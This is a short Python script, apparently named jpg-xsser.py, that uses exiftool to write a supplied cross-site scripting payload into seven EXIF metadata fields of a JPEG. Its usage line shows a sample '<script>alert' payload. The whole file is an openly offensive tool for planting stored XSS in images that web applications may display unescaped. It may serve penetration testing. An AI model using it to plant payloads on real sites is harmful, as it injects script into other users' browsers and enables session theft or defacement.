import sys
import subprocess

metadata = [
	"ImageDescription",
	"Make",
	"Model",
	"Software",
	"Copyright",
	"Location",
	"Description"
]

if sys.argv[1] and sys.argv[2]:
	img = sys.argv[1]
	xss = sys.argv[2]
	
	for exif in metadata:
		attr = "-{0}={1}".format(exif, xss)
		subprocess.call(["exiftool", attr, img])
else:
	print("usage: python3 jpg-xsser.py some.jpg '<script>alert(\"xss\")'")
